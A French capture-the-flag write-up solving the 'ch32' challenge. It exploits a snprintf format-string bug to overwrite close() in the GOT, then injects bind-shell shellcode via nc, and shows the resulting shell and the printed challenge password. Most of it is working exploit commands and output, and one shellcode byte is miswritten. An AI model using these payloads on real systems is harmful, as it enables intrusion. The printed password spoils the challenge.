@@ -1,0 +1,106 @@
+Sur ce projet on va reecrire le pointeur sur fonction d'un appel externe ( close() ) en utilisant une faille de type format string : snprintf (output, sizeof (output), input).
+
+$ objdump -R ./ch32
+./ch32:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049ff0 R_386_GLOB_DAT    __gmon_start__
+0804a058 R_386_COPY        __environ
+0804a000 R_386_JUMP_SLOT   setsockopt
+0804a004 R_386_JUMP_SLOT   printf
+0804a008 R_386_JUMP_SLOT   wait
+0804a00c R_386_JUMP_SLOT   htons
+0804a010 R_386_JUMP_SLOT   perror
+0804a014 R_386_JUMP_SLOT   accept
+0804a018 R_386_JUMP_SLOT   getpid
+0804a01c R_386_JUMP_SLOT   __gmon_start__
+0804a020 R_386_JUMP_SLOT   exit
+0804a024 R_386_JUMP_SLOT   __libc_start_main
+0804a028 R_386_JUMP_SLOT   bind
+0804a02c R_386_JUMP_SLOT   memset
+0804a030 R_386_JUMP_SLOT   snprintf
+0804a034 R_386_JUMP_SLOT   fork
+0804a038 R_386_JUMP_SLOT   htonl
+0804a03c R_386_JUMP_SLOT   listen
+0804a040 R_386_JUMP_SLOT   socket
+0804a044 R_386_JUMP_SLOT   recv
+0804a048 R_386_JUMP_SLOT   close
+0804a04c R_386_JUMP_SLOT   send
+
+$ gdb ./ch32
+gdb$ x/wx 0x804a048
+0x804a048 <close@got.plt>:	0x08048696
+
+Cest 0x08048696 qu'il va falloir reecrire. Pour cela on va exploiter snprintf:
+$ python -c 'print "\x48\xa0\x04\x08AAAA\x4a\xa0\x04\x08"'
+
+Dans gdb:
+$ x/80x $ebp-0x81c <- (adresse de input[1024])
+0xbfff3ac 0x48a00408 0x41414141 0x4aa00408 0x00000000 0x00000000
+0xbfff3cc 0x00000000 0x00000000 0x00000000 0x00000000 0x00000000
+...
+
+En testant simplement lexecutable pour trouver l'offset:
+AAAA %x %x %x %x %x
+0 10 0 3 41414141
+On trouve qu'il se trouve a la 5eme position.
+
+$ python -c 'print "\x48\xa0\x04\x08AAAA\x4a\xa0\x04\x08" + "%x%x%x%62404x%hn%52283x%hn"'
+62404 = 0xf3d4.
+52283 = 0x1bfff - 0xf3d4.
+$ x/wx 0x804a048
+0x804a048 <close@got.plt>:  0xbffff3d4
+
+Donc la on a reussi a reecrire ou pointe close(). Donc quand close() va etre appeler, le programme va se diriger vers 0xbffff3d4.
+
+On va utiliser input[LENGHT] pour executer notre bindshell.
+$ python -c 'print "\x48\xa0\x04\x08AAAA\x4a\xa0\x04\x08" + "%x%x%x%62404x%hn%52283x%hn" + "\x90"*100 + "x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"' | nc localhost 56032
+
+Mais ! Il y a un decalage entre ce que gdb nous envoi pour l'adresse de input et le programme, on va modifier notre adresse par plage de 20:
+On ajoute au premier nombre, on retire au deuxieme...
+$ python -c 'print "\x48\xa0\x04\x08AAAA\x4a\xa0\x04\x08" + "%x%x%x%62424x%hn%52263x%hn"...
+$ python -c 'print "\x48\xa0\x04\x08AAAA\x4a\xa0\x04\x08" + "%x%x%x%62444x%hn%52243x%hn"...
+$ python -c 'print "\x48\xa0\x04\x08AAAA\x4a\xa0\x04\x08" + "%x%x%x%62464x%hn%52223x%hn"...
+$ python -c 'print "\x48\xa0\x04\x08AAAA\x4a\xa0\x04\x08" + "%x%x%x%62484x%hn%52203x%hn"...
+$ python -c 'print "\x48\xa0\x04\x08AAAA\x4a\xa0\x04\x08" + "%x%x%x%62504x%hn%52183x%hn"... etc
+
+$ python -c 'print "\x48\xa0\x04\x08AAAA\x4a\xa0\x04\x08" + "%x%x%x%62518x%hn%52153x%hn" + "\x90"*100 + "x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"' | nc localhost 56032
+
+on lance ensuite nc:
+$ nc localhost 17771
+ls
+bin
+boot
+cgroup
+challenge
+core
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+selinux
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+cd challenge/app-systeme/ch32
+cat .passwd
+P+m{?|#~tOQJy\") AX%]AF3
+
+TADA !!!
+
+
